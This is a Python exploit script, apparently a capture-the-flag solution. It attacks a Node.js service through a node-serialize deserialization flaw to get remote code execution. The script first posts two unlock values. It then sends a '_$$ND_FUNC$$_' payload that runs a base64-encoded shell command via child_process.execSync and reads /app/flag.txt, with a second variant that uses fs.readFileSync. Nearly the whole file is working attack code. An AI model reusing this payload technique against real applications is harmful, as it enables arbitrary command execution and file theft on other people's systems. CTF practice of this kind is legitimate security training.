#!/usr/bin/env python3
import requests
import json
import base64

TARGET = "http://obfusca-not-thor.hackday.fr:4224"

session = requests.Session()

def unlock():
    session.post(TARGET + '/vuqsqsddqsdln123', data={'data': 'ad1mi12n'})
    session.post(TARGET + '/vuqsqsqdsddqsdln1', data={'data': 'ba12'})

def rce_raw(js_code):
    """Execute arbitrary JS in node-serialize context"""
    # Wrap in node-serialize compatible format
    # The JS code becomes the function body
    ns_payload = '{"rce":"_$$ND_FUNC$$_function(){' + js_code + '}()"}'
    r = session.post(
        TARGET + '/vul18ddqsdln126',
        data={'data': ns_payload},
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    try:
        result = r.json()
        return result.get('rce', r.text)
    except:
        return r.text

# Use base64 encoded command to avoid shell escaping issues
# Command: cat /app/flag.txt
cmd_b64 = base64.b64encode(b"cat /app/flag.txt").decode()
print(f"[*] Command b64: {cmd_b64}")

# The JS will decode and run it via execSync with bash -c
js = f"var b=Buffer.from('{cmd_b64}','base64').toString();return require('child_process').execSync(b).toString();"

print("[*] Unlocking state machine...")
unlock()

print("[*] Reading /app/flag.txt via base64-encoded command...")
result = rce_raw(js)
print(f"[*] FLAG: {result}")

# Also try reading it directly with require('fs')
print()
print("[*] Alternative: reading via require('fs')...")
unlock()
js2 = "return require('fs').readFileSync('/app/flag.txt','utf8');"
result2 = rce_raw(js2)
print(f"[*] FLAG (fs): {result2}")
